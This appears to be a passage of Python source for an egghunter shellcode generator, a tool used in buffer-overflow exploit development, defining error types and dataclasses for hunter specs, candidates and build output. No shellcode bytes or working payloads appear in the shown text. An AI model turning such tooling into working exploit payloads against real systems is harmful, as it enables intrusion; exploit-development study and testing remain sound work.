class EgghunterError(Exception):
    """Base error for egghunter generation."""


class UnsupportedHunterError(EgghunterError):
    """Raised when a requested hunter is not implemented."""


class BadCharError(EgghunterError):
    """Raised when generated bytes contain excluded characters."""


class SelectionError(EgghunterError):
    """Raised when no hunter variant satisfies the requested constraints."""


@dataclass(frozen=True, slots=True)
class HunterSpec:
    name: str
    arch: str
    size: int | None
    needs_api_address: bool = False
    needs_syscall_id: bool = False
    notes: str = ""


@dataclass(frozen=True, slots=True)
class BuildResult:
    kind: HunterKind
    tag: bytes
    shellcode: bytes

    @property
    def hex_escaped(self) -> str:
        return to_hex_escaped(self.shellcode)

    @property
    def python_bytes_literal(self) -> str:
        return f'b"{self.hex_escaped}"'

    def write_raw(self, path: str | Path) -> Path:
        return write_raw(path, self.shellcode)


@dataclass(frozen=True, slots=True)
class HunterCandidate:
    name: str
    shellcode: bytes
    size: int
    uses_syscall: bool
    arch: str = "x86"


